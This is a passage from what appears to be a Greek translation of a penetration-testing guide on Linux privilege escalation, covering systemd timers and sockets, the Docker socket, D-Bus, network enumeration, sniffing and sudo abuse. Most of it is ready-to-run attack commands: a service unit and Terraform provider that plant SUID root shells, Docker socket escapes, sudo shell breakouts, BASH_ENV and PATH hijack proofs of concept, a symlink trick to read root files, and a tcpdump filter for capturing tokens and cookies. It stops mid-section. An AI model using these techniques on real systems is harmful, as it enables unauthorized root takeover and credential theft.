Στη συνέχεια, δημιούργησε ένα **εκτελέσιμο** με το **ίδιο όνομα όπως το binary της σχετικής διαδρομής** μέσα στον φάκελο PATH του systemd όπου μπορείς να γράψεις, και όταν η υπηρεσία κληθεί να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), το **backdoor σου θα εκτελεστεί** (οι χρήστες χωρίς προνόμια συνήθως δεν μπορούν να ξεκινήσουν/σταματήσουν υπηρεσίες αλλά έλεγξε αν μπορείς να χρησιμοποιήσεις `sudo -l`).

**Μάθε περισσότερα για τις υπηρεσίες με `man systemd.service`.**

## **Timers**

**Timers** είναι αρχεία μονάδας systemd των οποίων το όνομα τελειώνει σε `**.timer**` που ελέγχουν `**.service**` αρχεία ή συμβάντα. Οι **Timers** μπορούν να χρησιμοποιηθούν ως εναλλακτική στο cron καθώς έχουν ενσωματωμένη υποστήριξη για γεγονότα ημερολογιακού χρόνου και μονότονα χρονικά γεγονότα και μπορούν να τρέξουν ασύγχρονα.

Μπορείς να απαριθμήσεις όλους τους Timers με:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι χρονοδιακόπτες

Εάν μπορείτε να τροποποιήσετε έναν χρονοδιακόπτη, μπορείτε να τον κάνετε να εκτελέσει κάποιες υπάρχουσες μονάδες του systemd.unit (όπως ένα `.service` ή ένα `.target`)
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι η μονάδα:

> Η μονάδα που θα ενεργοποιηθεί όταν εκπνεύσει αυτό το timer. Το όρισμα είναι ένα όνομα μονάδας, του οποίου η κατάληξη δεν είναι ".timer". Αν δεν καθοριστεί, αυτή η τιμή προεπιλέγεται σε ένα service που έχει το ίδιο όνομα με τη timer μονάδα, εκτός από την κατάληξη. (Δείτε παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της timer μονάδας να ονομάζονται ταυτόσημα, εκτός από την κατάληξη.

Επομένως, για να καταχραστείτε αυτήν την άδεια θα πρέπει να:

- Βρείτε κάποια systemd μονάδα (όπως `.service`) που **εκτελεί ένα εγγράψιμο δυαδικό αρχείο**
- Βρείτε κάποια systemd μονάδα που **εκτελεί μια σχετική διαδρομή** και έχετε **δικαιώματα εγγραφής** πάνω στο **systemd PATH** (για να μιμηθείτε το εκτελέσιμο)

**Μάθετε περισσότερα για τα timers με `man systemd.timer`.**

### **Ενεργοποίηση Timer**

Για να ενεργοποιήσετε ένα timer χρειάζεστε δικαιώματα root και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι ο **timer** **ενεργοποιείται** δημιουργώντας ένα symlink στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) επιτρέπουν την **επικοινωνία διεργασιών** σε τον ίδιο ή διαφορετικό υπολογιστή μέσα σε client-server μοντέλα. Χρησιμοποιούν τυπικά αρχεία descriptor του Unix για επικοινωνία μεταξύ υπολογιστών και ρυθμίζονται μέσω `.socket` αρχείων.

Sockets μπορούν να ρυθμιστούν χρησιμοποιώντας αρχεία `.socket`.

**Μάθετε περισσότερα για τα sockets με `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να ρυθμιστούν διάφορες ενδιαφέρουσες παράμετροι:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν αλλά μια σύνοψη χρησιμοποιείται για να **υποδείξει πού θα ακούει** το socket (τη διαδρομή του αρχείου AF_UNIX socket, την IPv4/6 και/ή τον αριθμό port για ακρόαση, κ.λπ.)
- `Accept`: Παίρνει ένα boolean όρισμα. Εάν **true**, μια **εγγραφή service εκκινείται για κάθε εισερχόμενη σύνδεση** και μόνο το socket της σύνδεσης περνάει σε αυτήν. Εάν **false**, όλα τα listening sockets οι ίδιοι **περνιούνται στη μονάδα service που ξεκινά**, και μόνο μία μονάδα service εκκινείται για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs όπου μια ενιαία μονάδα service χειρίζεται χωρίς όρους όλη την εισερχόμενη κίνηση. **Προεπιλογή: false**. Για λόγους απόδοσης, συνιστάται οι νέοι daemons να γράφονται με τρόπο κατάλληλο για `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Παίρνουν μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τα listening **sockets**/FIFOs **δημιουργηθούν** και δεσμευτούν, αντίστοιχα. Το πρώτο token της γραμμής εντολής πρέπει να είναι ένα απόλυτο όνομα αρχείου, ακολουθούμενο από τα επιχειρήματα για τη διαδικασία.
- `ExecStopPre`, `ExecStopPost`: Επιπρόσθετες **εντολές** που **εκτελούνται πριν** ή **μετά** τα listening **sockets**/FIFOs **κλείσουν** και αφαιρεθούν, αντίστοιχα.
- `Service`: Ορίζει το όνομα της μονάδας service που θα **ενεργοποιηθεί** σε περίπτωση **εισερχόμενης κίνησης**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Προκαθορίζεται στην service που φέρει το ίδιο όνομα με το socket (με το επίθημα αντικατεστημένο). Στις περισσότερες περιπτώσεις δεν θα πρέπει να είναι απαραίτητο να χρησιμοποιήσετε αυτή την επιλογή.

### Writable .socket files

Αν βρείτε ένα **εγγράψιμο** `.socket` αρχείο μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι σαν: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν το socket δημιουργηθεί. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει reboot της μηχανής.**\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί αυτή τη διαμόρφωση αρχείου socket αλλιώς το backdoor δεν θα εκτελεστεί_

### Socket activation + writable unit path (create missing service)

Μια ακόμη πολύ σοβαρή λάθος διαμόρφωση είναι:

- μια socket unit με `Accept=no` και `Service=<name>.service`
- η αναφερόμενη μονάδα service λείπει
- ένας επιτιθέμενος μπορεί να γράψει στο `/etc/systemd/system` (ή σε άλλη unit search path)

Σε αυτή την περίπτωση, ο επιτιθέμενος μπορεί να δημιουργήσει `<name>.service`, και στη συνέχεια να προκαλέσει κίνηση προς το socket ώστε το systemd να φορτώσει και να εκτελέσει τη νέα service ως root.

Γρήγορη ροή:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Εγγράψιμα sockets

Εάν **εντοπίσετε κάποιο εγγράψιμο socket** (_τώρα μιλάμε για Unix Sockets και όχι για τα config `.socket` αρχεία_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να κάνετε exploit σε μια ευπάθεια.
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν μερικά **sockets που ακούνε για HTTP** αιτήματα (_δεν αναφέρομαι σε αρχεία .socket αλλά στα αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να ελέγξετε αυτό με:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Εάν το socket **απαντά με ένα HTTP request**, τότε μπορείτε να **επικοινωνήσετε** μαζί του και ίσως να **εκμεταλλευτείτε κάποια ευπάθεια**.

### Εγγράψιμο Docker Socket

Το Docker socket, που συνήθως βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να προστατευτεί. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή δικαιώματος εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Ακολουθεί μια ανάλυση του πώς μπορεί να γίνει αυτό και εναλλακτικές μέθοδοι εάν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation with Docker CLI**

Αν έχετε δικαίωμα εγγραφής στο Docker socket, μπορείτε να κάνετε privilege escalation χρησιμοποιώντας τις ακόλουθες εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Αυτές οι εντολές σας επιτρέπουν να εκτελέσετε ένα container με πρόσβαση επιπέδου root στο σύστημα αρχείων του host.

#### **Χρήση Docker API απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί ακόμα να χειριστεί χρησιμοποιώντας το Docker API και εντολές `curl`.

1.  **List Docker Images:** Ανακτήστε τη λίστα των διαθέσιμων images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Στείλτε ένα αίτημα για να δημιουργήσετε ένα container που κάνει mount τον root κατάλογο του host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Χρησιμοποιήστε το `socat` για να ανοίξετε μια σύνδεση με το container, επιτρέποντας την εκτέλεση εντολών εντός αυτού.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Αφού ρυθμίσετε τη σύνδεση `socat`, μπορείτε να εκτελείτε εντολές απευθείας στο container με πρόσβαση root στο σύστημα αρχείων του host.

### Άλλα

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο docker socket επειδή είστε **inside the group `docker`** έχετε [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Αν το [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Δείτε **more ways to break out from docker or abuse it to escalate privileges** σε:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`** διαβάστε την παρακάτω σελίδα καθώς **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`** διαβάστε την παρακάτω σελίδα καθώς **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus είναι ένα εξελιγμένο σύστημα inter-Process Communication (IPC) που επιτρέπει στις εφαρμογές να αλληλεπιδρούν αποτελεσματικά και να μοιράζονται δεδομένα. Σχεδιασμένο με το σύγχρονο σύστημα Linux κατά νου, προσφέρει ένα στιβαρό πλαίσιο για διάφορες μορφές επικοινωνίας μεταξύ εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασικό IPC που βελτιώνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, παρομοιάζοντας με **enhanced UNIX domain sockets**. Επιπλέον, βοηθά στη μετάδοση γεγονότων ή σημάτων, διευκολύνοντας την ολοκλήρωση μεταξύ των στοιχείων του συστήματος. Για παράδειγμα, ένα σήμα από ένα Bluetooth daemon σχετικά με μια εισερχόμενη κλήση μπορεί να προκαλέσει έναν music player να σιωπήσει, βελτιώνοντας την εμπειρία χρήστη. Επιπλέον, το D-Bus υποστηρίζει ένα απομακρυσμένο αντικειμενοσύστημα, απλουστεύοντας αιτήματα υπηρεσιών και κλήσεις μεθόδων μεταξύ εφαρμογών, απλοποιώντας διαδικασίες που παραδοσιακά ήταν πολύπλοκες.

Το D-Bus λειτουργεί με ένα **allow/deny model**, διαχειριζόμενο τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων, κ.λπ.) με βάση το σωρευτικό αποτέλεσμα ταιριασμένων κανόνων πολιτικής. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus, ενδεχομένως επιτρέποντας privilege escalation μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Παρατίθεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, που αναλύει τα δικαιώματα για τον χρήστη root να κατέχει, να στέλνει σε και να λαμβάνει μηνύματα από `fi.w1.wpa_supplicant1`.

Πολιτικές χωρίς καθορισμένο χρήστη ή group εφαρμόζονται καθολικά, ενώ οι πολιτικές σε "default" context εφαρμόζονται σε όλους όσους δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθε πώς να enumerate και να exploit μια επικοινωνία D-Bus εδώ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να κάνεις enumerate το δίκτυο και να προσδιορίσεις τη θέση της μηχανής.

### Γενική enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Γρήγορη διαγνωστική διερεύνηση φιλτραρίσματος εξερχόμενων

Εάν ο host μπορεί να εκτελεί εντολές αλλά τα callbacks αποτυγχάνουν, απομονώστε γρήγορα προβλήματα στο DNS, transport, proxy και route filtering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Ανοιχτές θύρες

Ελέγχετε πάντα τις υπηρεσίες δικτύου που τρέχουν στη μηχανή και με τις οποίες δεν μπορέσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτήν:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Κατηγοριοποιήστε τους listeners ανά bind target:

- `0.0.0.0` / `[::]`: εκτεθειμένοι σε όλες τις τοπικές διεπαφές.
- `127.0.0.1` / `::1`: μόνο τοπικά (καλοί υποψήφιοι για tunnel/forward).
- Συγκεκριμένες εσωτερικές διευθύνσεις IP (π.χ. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): συνήθως προσβάσιμες μόνο από εσωτερικά δίκτυα.

### Ροή διαλογής για υπηρεσίες που είναι μόνο τοπικές

Όταν compromise έναν host, οι υπηρεσίες που είναι bound στο `127.0.0.1` συχνά γίνονται προσπελάσιμες για πρώτη φορά από το shell σας. Μια γρήγορη τοπική ροή εργασίας είναι:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as a network scanner (network-only mode)

Πέρα από τους local PE checks, το linPEAS μπορεί να λειτουργήσει ως εστιασμένος network scanner. Χρησιμοποιεί διαθέσιμα binaries στο `$PATH` (τυπικά `fping`, `ping`, `nc`, `ncat`) και δεν εγκαθιστά tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Αν περάσετε `-d`, `-p`, ή `-i` χωρίς `-t`, linPEAS συμπεριφέρεται ως pure network scanner (παραλείποντας το υπόλοιπο των privilege-escalation checks).

### Sniffing

Ελέγξτε αν μπορείτε να sniff traffic. Αν μπορείτε, ίσως καταφέρετε να αποκτήσετε κάποιες credentials.
```
timeout 1 tcpdump
```
Γρήγοροι πρακτικοί έλεγχοι:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Η διεπαφή loopback (`lo`) είναι ιδιαίτερα πολύτιμη στο post-exploitation, επειδή πολλές υπηρεσίες που είναι διαθέσιμες μόνο εσωτερικά εκθέτουν εκεί tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture τώρα, parse αργότερα:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Χρήστες

### Γενική Απογραφή

Ελέγξτε **who** είστε, ποιες **privileges** έχετε, ποιοι **users** υπάρχουν στα συστήματα, ποιοι μπορούν να **login** και ποιοι έχουν **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Κάποιες εκδόσεις του Linux επηρεάστηκαν από ένα σφάλμα που επιτρέπει σε χρήστες με **UID > INT_MAX** να αποκτήσουν αυξημένα προνόμια. Περισσότερες πληροφορίες: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Εκμεταλλευτείτε το** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας παραχωρήσει προνόμια root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Πρόχειρο

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον στο πρόχειρο (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών Πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί

Αν **γνωρίζεις οποιονδήποτε κωδικό** του περιβάλλοντος **προσπάθησε να συνδεθείς ως κάθε χρήστης** χρησιμοποιώντας τον κωδικό.

### Su Brute

Αν δεν σε ενοχλεί να δημιουργήσεις πολύ θόρυβο και τα `su` και `timeout` εκτελέσιμα υπάρχουν στον υπολογιστή, μπορείς να προσπαθήσεις brute-force ενός χρήστη χρησιμοποιώντας [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` προσπαθεί επίσης να κάνει brute-force χρηστών.

## Καταχρήσεις εγγράψιμου PATH

### $PATH

Αν διαπιστώσεις ότι μπορείς να **γράψεις μέσα σε κάποιο φάκελο του $PATH** ίσως καταφέρεις να ανεβάσεις προνόμια με το **δημιουργώντας μια backdoor μέσα στον εγγράψιμο φάκελο** με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (κατά προτίμηση root) και που **δεν φορτώνεται από φάκελο που βρίσκεται πριν** από τον εγγράψιμο φάκελο στο $PATH.

### SUDO and SUID

Μπορεί να σου επιτρέπεται να εκτελέσεις κάποια εντολή χρησιμοποιώντας sudo ή αυτές μπορεί να έχουν το suid bit. Έλεγξέ το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Κάποιες **απρόσμενες εντολές σας επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμη και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η ρύθμιση του sudo μπορεί να επιτρέπει σε έναν χρήστη να εκτελέσει κάποια εντολή με τα προνόμια άλλου χρήστη χωρίς να γνωρίζει τον κωδικό
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα ο χρήστης `demo` μπορεί να τρέξει το `vim` ως `root`, είναι πλέον απλό να αποκτήσει κανείς ένα shell προσθέτοντας ένα ssh key στον κατάλογο του `root` ή καλώντας `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση κάποιου προγράμματος:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στο HTB machine Admirer**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking** για να φορτώσει μια αυθαίρετη βιβλιοθήκη python ενώ εκτελούσε το script ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV διατηρείται μέσω sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να εκμεταλλευτείτε τη μη-διαδραστική συμπεριφορά εκκίνησης του Bash για να τρέξετε αυθαίρετο κώδικα ως root όταν καλείτε μια επιτρεπόμενη εντολή.

- Why it works: Για μη-διαδραστικά shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source αυτό το αρχείο πριν τρέξει το στοχευμένο script. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Εάν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας γίνεται source με προνόμια root.

- Απαιτήσεις:
- Ένας sudo κανόνας που μπορείτε να τρέξετε (οποιοδήποτε target που καλεί `/bin/bash` μη-διαδραστικά, ή οποιοδήποτε bash script).
- Το `BASH_ENV` να είναι παρόν στο `env_keep` (ελέγξτε με `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Σκληροποίηση:
- Αφαιρέστε `BASH_ENV` (και `ENV`) από το `env_keep`, προτιμήστε `env_reset`.
- Αποφύγετε shell wrappers για εντολές που επιτρέπονται μέσω sudo· χρησιμοποιήστε ελάχιστα binaries.
- Σκεφτείτε sudo I/O logging και ειδοποιήσεις όταν χρησιμοποιούνται preserved env vars.

### Terraform μέσω sudo με διατηρημένο HOME (!env_reset)

Εάν το sudo αφήνει το περιβάλλον ανέπαφο (`!env_reset`) ενώ επιτρέπει το `terraform apply`, το `$HOME` παραμένει του χρήστη που έκανε την κλήση. Επομένως το Terraform φορτώνει **$HOME/.terraformrc** ως root και σέβεται το `provider_installation.dev_overrides`.

- Κατευθύνετε τον απαιτούμενο provider σε έναν εγγράψιμο κατάλογο και τοποθετήστε ένα κακόβουλο plugin με το όνομα του provider (π.χ., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Το Terraform θα αποτύχει στο Go plugin handshake, αλλά εκτελεί το payload ως root πριν τερματίσει, αφήνοντας πίσω ένα SUID shell.

### TF_VAR overrides + symlink validation bypass

Οι μεταβλητές του Terraform μπορούν να δοθούν μέσω των περιβαλλοντικών μεταβλητών `TF_VAR_<name>`, οι οποίες επιβιώνουν όταν το sudo διατηρεί το περιβάλλον. Αδύναμοι έλεγχοι όπως `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` μπορούν να παρακαμφθούν με symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform επιλύει το symlink και αντιγράφει το πραγματικό `/root/root.txt` σε έναν προορισμό αναγνώσιμο από επιτιθέμενο. Η ίδια προσέγγιση μπορεί να χρησιμοποιηθεί για να **γράψετε** σε προνομιακούς καταλόγους δημιουργώντας εκ των προτέρων symlinks προορισμού (π.χ., δείχνοντας το μονοπάτι προορισμού του provider μέσα στο `/etc/cron.d/`).

### requiretty / !requiretty

Σε κάποιες παλαιότερες διανομές, το sudo μπορεί να ρυθμιστεί με `requiretty`, που αναγκάζει το sudo να τρέχει μόνο από ένα διαδραστικό TTY. Αν έχει τεθεί το `!requiretty` (ή η επιλογή λείπει), το sudo μπορεί να εκτελεστεί από μη-διαδραστικά περιβάλλοντα όπως reverse shells, cron jobs ή scripts.
```bash
Defaults !requiretty
```
This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Αν το `sudo -l` δείχνει `env_keep+=PATH` ή ένα `secure_path` που περιέχει καταχωρήσεις που μπορεί να γράψει ο επιτιθέμενος (π.χ., `/home/<user>/bin`), οποιαδήποτε σχετική εντολή μέσα στον sudo-επιτρεπόμενο στόχο μπορεί να επισκιαστεί.

- Απαιτήσεις: ένας κανόνας sudo (συνήθως `NOPASSWD`) που τρέχει ένα script/binary που καλεί εντολές χωρίς απόλυτες διαδρομές (`free`, `df`, `ps`, κ.λπ.) και μια εγγράψιμη καταχώρηση PATH που αναζητείται πρώτη.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
